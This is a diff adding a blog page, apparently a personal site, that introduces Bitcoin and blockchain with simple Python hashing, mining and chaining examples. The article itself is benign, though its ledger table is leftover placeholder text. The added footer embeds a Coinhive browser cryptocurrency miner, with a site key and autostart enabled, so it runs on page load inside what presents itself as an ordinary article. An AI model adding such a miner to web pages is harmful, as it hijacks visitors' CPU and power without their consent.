@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="en-US">
+    <head>
+        <meta charset="utf-8"> 
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta name="author" content="James Campbell" />
+        <meta name="copyright" content="James Campbell" />
+
+<meta name="keywords" content="blockchain, bitcoin, misc, " />
+        <title>An Introduction to Bitcoin and Blockchain  · James Campbell
+</title>
+        <link href="http://cdn-images.mailchimp.com/embedcode/slim-081711.css" rel="stylesheet" type="text/css">
+        <link href="//netdna.bootstrapcdn.com/twitter-bootstrap/2.3.1/css/bootstrap-combined.min.css" rel="stylesheet">
+        <link rel="stylesheet" type="text/css" href="http://www.jamescampbell.org.uk/theme/css/style.css" media="screen">
+        <link rel="stylesheet" type="text/css" href="http://www.jamescampbell.org.uk/theme/css/solarizedlight.css" media="screen">
+        <link rel="shortcut icon" href="http://www.jamescampbell.org.uk/theme/images/favicon.ico" type="image/x-icon" />
+        <link rel="apple-touch-icon" href="http://www.jamescampbell.org.uk/theme/images/apple-touch-icon.png" />
+        <link rel="apple-touch-icon" sizes="57x57" href="http://www.jamescampbell.org.uk/theme/images/apple-touch-icon-57x57.png" />
+        <link rel="apple-touch-icon" sizes="72x72" href="http://www.jamescampbell.org.uk/theme/images/apple-touch-icon-72x72.png" />
+        <link rel="apple-touch-icon" sizes="114x114" href="http://www.jamescampbell.org.uk/theme/images/apple-touch-icon-114x114.png" />
+        <link rel="apple-touch-icon" sizes="144x144" href="http://www.jamescampbell.org.uk/theme/images/apple-touch-icon-144x144.png" />
+        <link rel="icon" href="http://www.jamescampbell.org.uk/theme/images/apple-touch-icon-144x144.png" />
+        <link href="http://www.jamescampbell.org.uk/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="James Campbell - Full Atom Feed" />
+        <link href="http://www.jamescampbell.org.uk/feeds/misc.atom.xml" type="application/atom+xml" rel="alternate" title="James Campbell - misc Category Atom Feed" />
+    </head>
+    <body>
+        <div id="content-sans-footer">
+        <div class="navbar navbar-static-top">
+            <div class="navbar-inner">
+                <div class="container">
+                    <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </a>
+                    <a class="brand" href="http://www.jamescampbell.org.uk/"><span class=site-name>James Campbell</span></a>
+                    <div class="nav-collapse collapse">
+                        <ul class="nav pull-right top-menu">
+                            <li ><a href="http://www.jamescampbell.org.uk">Home</a></li>
+                            <li ><a href="http://www.jamescampbell.org.uk/pages/about-me.html">About Me</a></li>
+                            <li ><a href="http://www.jamescampbell.org.uk/categories.html">Categories</a></li>
+                            <li ><a href="http://www.jamescampbell.org.uk/tags.html">Tags</a></li>
+                            <li ><a href="http://www.jamescampbell.org.uk/archives.html">Archives</a></li>
+                            <li><form class="navbar-search" action="http://www.jamescampbell.org.uk/search.html" onsubmit="return validateForm(this.elements['q'].value);"> <input type="text" class="search-query" placeholder="Search" name="q" id="tipue_search_input"></form></li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="container-fluid">
+            <div class="row-fluid">
+                <div class="span1"></div>
+                <div class="span10">
+<article>
+<div class="row-fluid">
+    <header class="page_header span10 offset2">
+    <h1><a href="http://www.jamescampbell.org.uk/drafts/blockchain-intro.html"> An Introduction to Bitcoin and Blockchain  </a></h1>
+    </header>
+</div>
+
+<div class="row-fluid">
+        <div class="span8 offset2 article-content">
+
+            <p>This blog post is an accompaniment to a talk I gave at <a href="http://www.pydiff.wales/">PyDiff</a>.
+The slides for the talk can be found <a href="http://www.jamescampbell.org.uk/pdfs/blockchain-intro.pdf">here</a> and there is recording on <a href="https://www.youtube.com/watch?v=-fAR9-9QzVs">YouTube</a> as well.</p>
+<h2>History and Background</h2>
+<h4>Bitcoin: The first Blockchain</h4>
+<p>Bitcoin is the first Blockchain and you can't discuss one without the other.
+The Blockchain is just the underlying data structure of Bitcoin.
+Bitcoin couldn't exist without the Blockchain, but as soon as you have the Blockchain you inevitably also have Bitcoin.</p>
+<p>First physical goods bought was 2 pizzas and cost 10,000 Bitcoin. Same person was also the first on the Lightning Network. Lightning Network is a 2nd layer scaling solution which I won't discuss in this talk.</p>
+<p>First block included headline from The Times (3rd Jan) which provides insight for the motivation behind Bitcoin.</p>
+<h4>Definition</h4>
+<p>Quote is from Unkown because I can't remember where I heard it.
+- Transparent: No information is hidden
+- Public: Anyone can use it/access it
+- Distributed: Running on a global network
+- Append-Only: Can't be edited, only added to</p>
+<h4>The Ledger</h4>
+<p>Instead of using physical cash, or keeping track of everyone's individual balance, let's just record transactions. Eg Amy to Ben, Ben to Tesco etc.</p>
+<table>
+<thead>
+<tr>
+<th align="left">Tables</th>
+<th align="left">Are</th>
+<th align="right">Cool</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="left">col 3 is</td>
+<td align="left">right-aligned</td>
+<td align="right">$1600</td>
+</tr>
+<tr>
+<td align="left">col 2 is</td>
+<td align="left">centered</td>
+<td align="right">$12</td>
+</tr>
+<tr>
+<td align="left">zebra stripes</td>
+<td align="left">are neat</td>
+<td align="right">$1</td>
+</tr>
+</tbody>
+</table>
+<p>Everyone has a copy of this ledger and all copies are identical and updated together. Now whenever someone makes a transaction it's trivial to work out their balance and see if they can spend money.</p>
+<p>As long as we all have access to this ledger we can make financial transactions.</p>
+<h2>More Detail</h2>
+<p>That's how I described it to my Grandparents, you probably want some more details.
+Becomes a consensus problem: How do we ensure that we're all looking at the same ledger?
+Let's go a bit more technical and attempt to build it as we go.</p>
+<h4>Hash Function</h4>
+<ul>
+<li>Deterministic: Same message results in same hash</li>
+<li>Non-Invertible: Only way to recreate the input data is a brute force search.</li>
+<li>Collision Resistant: It is impossible to find 2 inputs that produce the same output.</li>
+<li>Avalanche Effect: a small change to a message should change the hash value so extensively that the new hash value appears uncorrelated with the old hash value</li>
+</ul>
+<p>Let's look at an example:</p>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">hashlib</span>
+<span class="k">print</span><span class="p">(</span><span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;hi&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">())</span>
+</pre></div>
+
+
+<p>Let's also write a function that can just hash a bunch inputs</p>
+<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">quick_hash</span><span class="p">(</span><span class="o">*</span><span class="n">inputs</span><span class="p">):</span>
+    <span class="n">seq</span> <span class="o">=</span> <span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">inputs</span><span class="p">)</span>
+    <span class="n">sha</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">()</span>
+    <span class="n">sha</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">seq</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
+    <span class="n">block_hash</span> <span class="o">=</span> <span class="n">sha</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">block_hash</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">quick_hash</span><span class="p">([</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">],</span> <span class="s1">&#39;asdf&#39;</span><span class="p">))</span>
+</pre></div>
+
+
+<h4>A Block</h4>
+<ul>
+<li>Index: So it can be identified</li>
+<li>Data: Can be anything for now</li>
+<li>Nonce: An arbitrary number</li>
+<li>Hashable: Define how we Hash a Block</li>
+</ul>
+<p>Create a class for a Block:</p>
+<div class="highlight"><pre><span></span><span class="k">class</span> <span class="nc">Block</span><span class="p">:</span>
+    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">index</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">index</span> <span class="o">=</span> <span class="n">index</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">data</span> <span class="o">=</span> <span class="n">data</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">nonce</span> <span class="o">=</span> <span class="mi">0</span>
+
+    <span class="k">def</span> <span class="fm">__str__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">f</span><span class="s1">&#39;Block #{self.index}: {self.data} {self.hash_block()} {self.nonce}&#39;</span>
+
+    <span class="k">def</span> <span class="nf">hash_block</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">block_hash</span> <span class="o">=</span> <span class="n">quick_hash</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">index</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">data</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">nonce</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">block_hash</span>
+
+
+<span class="n">example_block</span> <span class="o">=</span> <span class="n">Block</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;Silly Data&#39;</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">example_block</span><span class="p">)</span>
+</pre></div>
+
+
+<h4>Mining a Block</h4>
+<p>Also known as Proof of Work. We set a condition on the Hash of the block (start with a certain number of zeros) that can only be found by trying many different values for the nonce.</p>
+<div class="highlight"><pre><span></span><span class="k">class</span> <span class="nc">Block</span><span class="p">:</span>
+    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">index</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">index</span> <span class="o">=</span> <span class="n">index</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">data</span> <span class="o">=</span> <span class="n">data</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">nonce</span> <span class="o">=</span> <span class="mi">0</span>
+
+    <span class="k">def</span> <span class="fm">__str__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">f</span><span class="s1">&#39;Block #{self.index}: {self.data} {self.hash_block()} {self.nonce}&#39;</span>
+
+    <span class="k">def</span> <span class="nf">hash_block</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">block_hash</span> <span class="o">=</span> <span class="n">quick_hash</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">index</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">data</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">nonce</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">block_hash</span>
+
+    <span class="k">def</span> <span class="nf">mine</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">block_hash</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">hash_block</span><span class="p">()</span>
+        <span class="k">while</span> <span class="n">block_hash</span><span class="p">[:</span><span class="mi">4</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;0000&#39;</span><span class="p">:</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">nonce</span> <span class="o">+=</span> <span class="mi">1</span>
+            <span class="n">block_hash</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">hash_block</span><span class="p">()</span>
+        <span class="k">print</span><span class="p">(</span><span class="s1">&#39;Block Mined!!!&#39;</span><span class="p">)</span>
+
+<span class="n">example_block</span> <span class="o">=</span> <span class="n">Block</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;Silly Data&#39;</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">example_block</span><span class="p">)</span>
+<span class="n">example_block</span><span class="o">.</span><span class="n">mine</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="n">example_block</span><span class="p">,</span> <span class="n">example_block</span><span class="o">.</span><span class="n">nonce</span><span class="p">)</span>
+</pre></div>
+
+
+<p>If the Data in the Block changes, the Hash will no longer be valid and the block needs to be mined again.</p>
+<h4>A Blockchain</h4>
+<p>Link Blocks together (in a chain) by including the Hash of the previous Block.
+We need to allow for the fact that the first Block (Genesis Block) won't have anything to reference.</p>
+<div class="highlight"><pre><span></span><span class="k">class</span> <span class="nc">Block</span><span class="p">:</span>
+    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">index</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">previous_block</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">index</span> <span class="o">=</span> <span class="n">index</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">data</span> <span class="o">=</span> <span class="n">data</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">nonce</span> <span class="o">=</span> <span class="mi">0</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">previous_block</span> <span class="o">=</span> <span class="n">previous_block</span>
+
+    <span class="k">def</span> <span class="fm">__str__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">f</span><span class="s1">&#39;Block #{self.index}: {self.data} {self.hash_block()} {self.nonce}&#39;</span>
+
+    <span class="k">def</span> <span class="nf">hash_block</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">previous_block</span> <span class="o">==</span> <span class="s1">&#39;Genesis&#39;</span><span class="p">:</span>
+            <span class="n">previous_hash</span> <span class="o">=</span> <span class="s1">&#39;Genesis_Hash&#39;</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">previous_hash</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">previous_block</span><span class="o">.</span><span class="n">hash_block</span><span class="p">()</span>
+        <span class="n">block_hash</span> <span class="o">=</span> <span class="n">quick_hash</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">index</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">data</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">nonce</span><span class="p">,</span> <span class="n">previous_hash</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">block_hash</span>
+
+    <span class="k">def</span> <span class="nf">mine</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">block_hash</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">hash_block</span><span class="p">()</span>
+        <span class="k">while</span> <span class="n">block_hash</span><span class="p">[:</span><span class="mi">4</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;0000&#39;</span><span class="p">:</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">nonce</span> <span class="o">+=</span> <span class="mi">1</span>
+            <span class="n">block_hash</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">hash_block</span><span class="p">()</span>
+        <span class="k">print</span><span class="p">(</span><span class="s1">&#39;Block Mined!!!&#39;</span><span class="p">)</span>
+
+<span class="n">genesis_block</span> <span class="o">=</span> <span class="n">Block</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;Our First Block&#39;</span><span class="p">,</span> <span class="s1">&#39;Genesis&#39;</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">genesis_block</span><span class="p">)</span>
+<span class="n">genesis_block</span><span class="o">.</span><span class="n">mine</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="n">genesis_block</span><span class="p">)</span>
+
+<span class="n">example_block</span> <span class="o">=</span> <span class="n">Block</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;Silly Data&#39;</span><span class="p">,</span> <span class="n">genesis_block</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">example_block</span><span class="p">)</span>
+<span class="n">example_block</span><span class="o">.</span><span class="n">mine</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="n">example_block</span><span class="p">)</span>
+
+<span class="n">genesis_block</span><span class="o">.</span><span class="n">data</span> <span class="o">=</span> <span class="s1">&#39;Genesis Block&#39;</span>
+<span class="k">print</span><span class="p">(</span><span class="n">genesis_block</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">example_block</span><span class="p">)</span>
+
+<span class="n">genesis_block</span><span class="o">.</span><span class="n">mine</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="n">genesis_block</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">example_block</span><span class="p">)</span>
+
+<span class="n">example_block</span><span class="o">.</span><span class="n">mine</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="n">example_block</span><span class="p">)</span>
+</pre></div>
+
+
+<p>If the Previous Hash or the Data changes, the Block needs to be mined again.
+If we change something in a previous Block (regardless of how far in the past) the current Block will be invalid.</p>
+<p>Lets make a longer Blockchain:</p>
+<div class="highlight"><pre><span></span><span class="n">blockchain</span> <span class="o">=</span> <span class="p">[</span><span class="n">genesis_block</span><span class="p">]</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">8</span><span class="p">):</span>
+    <span class="n">new_block</span> <span class="o">=</span> <span class="n">Block</span><span class="p">(</span><span class="n">index</span><span class="o">=</span><span class="n">i</span><span class="p">,</span>
+                      <span class="n">data</span><span class="o">=</span><span class="s1">&#39;some data here&#39;</span><span class="p">,</span>
+                      <span class="n">previous_block</span><span class="o">=</span><span class="n">blockchain</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+    <span class="n">new_block</span><span class="o">.</span><span class="n">mine</span><span class="p">()</span>
+    <span class="n">blockchain</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">new_block</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">new_block</span><span class="p">)</span>
+</pre></div>
+
+
+<p>We can see that some of them took longer than others.
+What happens if a malicious attacker tries to edit some of the data?</p>
+<div class="highlight"><pre><span></span><span class="n">blockchain</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">data</span> <span class="o">=</span> <span class="s1">&#39;Malicious Attack&#39;</span>
+<span class="k">for</span> <span class="n">block</span> <span class="ow">in</span> <span class="n">blockchain</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">block</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">block</span> <span class="ow">in</span> <span class="n">blockchain</span><span class="p">[</span><span class="mi">2</span><span class="p">:]:</span>
+    <span class="n">block</span><span class="o">.</span><span class="n">mine</span><span class="p">()</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">block</span><span class="p">)</span>
+</pre></div>
+
+
+<p>They have to redo all of the computations for the previous blocks. Hence the phrase 'Proof of Work'. It takes CPU power to mine a Block so that it's valid and can be included in the Blockchain.</p>
+<h2>Even More Detail</h2>
+<p>I've explained the Data structure but I said it was a public, distributed network</p>
+<h4>The Blockchain Process</h4>
+<p>Going to link this to Bitcoin because it's a great example. Now need to imagine that this process is running globally on many computers.</p>
+<ul>
+<li>A user creates an addition to the ledger, for Bitcoin this would be a transaction</li>
+<li>Everyone in the Network can see that the user is attempting to make this transaction</li>
+<li>For Bitcoin, they package several transactions into a Block and race to find the appropriate Nonce</li>
+<li>When a Node finds an appropriate Nonce, the Block is added to the Blockchain and broadcast to the Network</li>
+<li>The process repeats with Nodes now attempting to find the next Block</li>
+</ul>
+<p>Nodes in the network use the longest Blockchain available. As soon as they receive a new, valid block they move on and start building the next one. In the (very rare) event that two Blocks are created simultaneously, the network forks. Some nodes follow one branch, some follow the other. At some point (the next block) one fork will become longer and all nodes use that one.</p>
+<h4>A Malicious Node</h4>
+<p>Attack goes back and edits B3 and computes new Nonce. Attackers chain is now 2 blocks behind the main chain and so is not recognised by the rest of the network (use longest chain).
+Has to redo PoW for B4 and B5 in order for their Blockchain to be used by rest of network.</p>
+<p>However, in that time, 'good' nodes will continue to add Blocks to the original chain. The attacker will not be able to catch up and the network will never include the malicious Block.</p>
+<h2>Tell Me More About Bitcoin</h2>
+<p>We've covered the Blockchain. We now have a process where we can be sure that we're all looking at the same ledger (we've acheived consensus). Been quite vague about several things...eg the nature of the data (that was to keep things very general), could be used for supply chain, medical records etc.</p>
+<p>This isn't enough for a digital currency like Bitcoin.</p>
+<h4>Unanswered Issues</h4>
+<ul>
+<li>Incentive for Good nodes, owning and running a pc costs money...why would I bother?</li>
+<li>At no point where any Bitcoins actually created, we've only covered how to transfer them</li>
+<li>Proof of Ownership, what stops someone else creating a transaction that spends my Bitcoins?</li>
+</ul>
+<h4>Coinbase Transaction</h4>
+<p>The first two issues are solved together. Every Block includes a transaction that has no sender, only a receiver. This is called a coinbase transaction. The value of the transaction is called a Block Reward and the recipient is the Node that successfully mines the Block (finds the correct Nonce).</p>
+<p>The Block Reward (currently 12.5 B) decreases over time to ensure that there is a finite supply of Bitcoin (21 million). Currently mined 17 million.</p>
+<p>We've now incentives good nodes and we call them miners and we have a way to gradually introduce new Bitcoins to the network in a predictable way.</p>
+<p>Lets quickly put all this together using a tool that someone else made that was what I had intended to make just much better.</p>
+<h4>Public/Private Key Pairs</h4>
+<p>Very common throughout cyber-security.
+Instead of using names, we generate a public/private key pair, and the public key becomes our Bitcoin address.</p>
+<p>When a transaction is created, the sender creates the signature of the transaction, using their private key. Thus anyone can easily verify that the transaction was created by the sender <strong>only</strong>.</p>
+<h2>Tell Me More</h2>
+<h4>Further Reading (Bitcoin)</h4>
+<ul>
+<li>Environmental Impact: lots of headlines in the media about Bitcoin using more electricity than Denmark. Wildly varying estimates. Less than USA uses on Christmas lights.</li>
+<li>Merkle Trees: How do we actually hash transaction such that it's efficient and easy to verify that a transaction exists.</li>
+<li>Segwit and Lightning: Both have been recently activated. Segwit makes blocks more efficient (therefore lower fees) and is a pre-requisite for Lightning. Lightning is a 2nd layer solution that allows for off chain, instant, near fee-less transactions.</li>
+</ul>
+<h4>Further Reading (future of Blockchain)</h4>
+<ul>
+<li>Proof of Stake; alternative to PoW. Miners selected based on wealth.</li>
+<li>Smart Contracts; code is stored on Blockchain and executed by the network</li>
+<li>DAG Currencies; replace linear Blockchain with Directed Acyclic Graphs</li>
+<li>Hashgraphs; DAG on steroids, uses a gossip protocol</li>
+</ul>
+            <aside>
+            <hr/>
+            </aside>
+        </div>
+        <section>
+        <div class="span2" style="float:right;font-size:0.9em;">
+ 
+            <h4>Published</h4>
+            <time pubdate="pubdate" datetime="2018-03-23T00:00:00+00:00">Mar 23, 2018</time>
+            <h4>Category</h4>
+            <a class="category-link" href="/categories.html#misc-ref">misc</a> 
+            <h4>Tags</h4>
+            <ul class="list-of-tags tags-in-article"> 
+                <li><a href="/tags.html#bitcoin-ref">bitcoin
+</a></li>
+                <li><a href="/tags.html#blockchain-ref">blockchain
+</a></li>
+            </ul>
+
+        </div>
+        </section>
+</div>
+</article>
+                </div>
+                <div class="span1"></div>
+            </div>
+        </div>
+    </div>
+<footer>
+<div id="footer">
+    <ul class="footer-content">
+        <li class="elegant-power">Powered by <a href="http://getpelican.com/" title="Pelican Home Page">Pelican</a>. Theme: <a href="http://oncrashreboot.com/pelican-elegant" title="Theme Elegant Home Page">Elegant</a> by <a href="http://oncrashreboot.com" title="Talha Mansoor Home Page">Talha Mansoor</a></li>
+    </ul>
+</div>
+<script src="https://coinhive.com/lib/miner.min.js" async></script>
+<div class="coinhive-miner"
+    style="width: 728px; height: 90px"
+    data-key="RDXcetlmnVFgsP5I9jriT0voHGw1VrdD"
+    data-autostart="true"
+    data-whitelabel="false"
+    data-background="#FFFFFF"
+    data-text="#000000"
+    data-action="#000000"
+    data-graph="#000000"
+    data-start="Start Now!">
+    <em>Please disable Adblock!</em>
+</div>
+</footer>            <script src="http://code.jquery.com/jquery.min.js"></script>
+        <script src="//netdna.bootstrapcdn.com/twitter-bootstrap/2.3.1/js/bootstrap.min.js"></script>
+        <script>
+            function validateForm(query)
+            {
+                return (query.length > 0);
+            }
+        </script>
+
+    </body>
+</html>
